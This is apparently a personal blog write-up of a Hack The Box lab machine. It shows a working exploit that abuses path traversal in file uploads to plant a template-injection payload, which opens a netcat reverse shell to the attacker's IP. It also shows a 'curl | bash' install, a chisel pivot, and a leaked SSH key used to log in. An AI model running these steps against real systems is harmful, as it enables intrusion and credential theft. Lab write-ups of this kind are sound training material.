+++
title = "First HTB CTF: OpenSource"
date = 2022-05-30

[taxonomies]
categories = ["htb"]
+++

This weekend I hacked my way through my first Hack The Box CTF. This was an exciting/frustrating and enlightening experience. This writeup will cronicle how I hacked the box, and some of the interestings things I learned on the way.

<!-- more -->
Ut luctus dolor ut tortor hendrerit, sed hendrerit augue scelerisque. Suspendisse quis sodales dui, at tempus ante. Nulla at tempor metus. Aliquam vitae rutrum diam. Curabitur iaculis massa dui, quis varius nulla finibus a. Praesent eu blandit justo. Suspendisse pharetra, arcu in rhoncus rutrum, magna magna viverra erat, eget vestibulum enim tellus id dui. Nunc vel dui et arcu posuere maximus. Mauris quam quam, bibendum sed libero nec, tempus hendrerit arcu. Suspendisse sed gravida orci. Fusce tempor arcu ac est pretium porttitor. Aenean consequat risus venenatis sem aliquam, at sollicitudin nulla semper. Aenean bibendum cursus hendrerit. Nulla congue urna nec finibus bibendum. Donec porta tincidunt ligula non ultricies.


# Write up OpenSource

The OpenSource machine was my first HTB machine and I had a great time hacking away and capturing the flags.

The CTF is named open source because the exploit revolves around an open source webapp.

**Discovery**

First we run a port scan on the box to see what services are running. 

```
nmap -sS 
```

We are told that there are 3 services running on this Linux box.

Port 22 is ssh, 3000 is some service that looks like it's running but has some IP rules protecting it. Lastly we have port 80 running the custom web app.

We can navigate to the IP in our browser to see what the site looks like.

At the bottom of the page we are given a link to the source.

Inspecting the contents we can see it's a git repo on the dev branch. We can also see that the app is running in a docker container with default args.

We want to see if the source code will give us a way to get us greater then expected access to the box. 

Inside of the views.py file we can see that the code makes relative path calls using user input.

This looks like a good way for us to access more information about or a way to place a file on the box.

We can see that there's some custom written validation logic that removes any ../ we include. It's also written recursively so we can manipulate it to include that sequence of chars.

We can however test if an extra / will navigate us to the root dir. 

After some testing we're positive that we can navigate to any directory in the box.





```python
import requests

# set ip addresses 
target = '10.10.11.164'
attacker = '10.10.14.48'
# attacker = '10.0.2.15'

# build payload for reverse shell
command = f'nc {attacker} 4444 -e /bin/sh'

headers = {
    'Host': target,
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'http://10.10.11.164',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarySHIrKoubQdZqALfJ',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Referer': 'http://10.10.11.164/upcloud',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'close',
}

# rewrite a template file by exploting the relative path
target_overwrite = '//app/app/templates/index.html'

# build template with injected python to access shell
# PS: use codepoint \u007b and \u007d
data = f'''------WebKitFormBoundarySHIrKoubQdZqALfJ
Content-Disposition: form-data; name="file"; filename="{target_overwrite}"
Content-Type: application/octet-stream


<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>@drbh</title>
<body>
<pre>
hello 

\u007b\u007b self.__init__.__globals__.__builtins__.__import__('os').system('{command}') \u007d\u007d
</pre>
</body>
</html>
------WebKitFormBoundarySHIrKoubQdZqALfJ--
'''
# send request
response = requests.post(f'http://{target}/upcloud', headers=headers, data=data, verify=False)
# print(response)
# print(response.text)

# load page to do remote execution
# PS: should be running reverse shell listener like: ncat -lvp 4444
try:
    requests.get(f'http://{target}/', timeout=1)
except:
    pass
```


python -c 'import pty; pty.spawn("/bin/ash")'

ctrl-z
stty raw -echo
stty raw -echo; fg


Pivot


```
## client
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_386.gz
ncat -lvp 8888 < chisel_1.7.7_linux_386.gz
nc 10.10.14.46 8888 > chisel.gz
gzip -d chisel.gz
chmod +x chisel
chisel client 10.10.14.46:7000 R:3000:10.10.11.164:3000


## server
curl https://i.jpillora.com/chisel! | bash
chisel server -p 7000 --reverse -v
```


```
git --no-pager log --decorate=short -3 --stat

git --no-pager diff a76f8f75f7a4a12b706b0cf9c983796fa1985820 -- app/.vscode/settings.json
```


curl http://localhost:3000/dev01/home-backup/raw/branch/main/.ssh/id_rsa > sshkey.pem


ssh -i sshkey.pem dev01@10.10.11.164
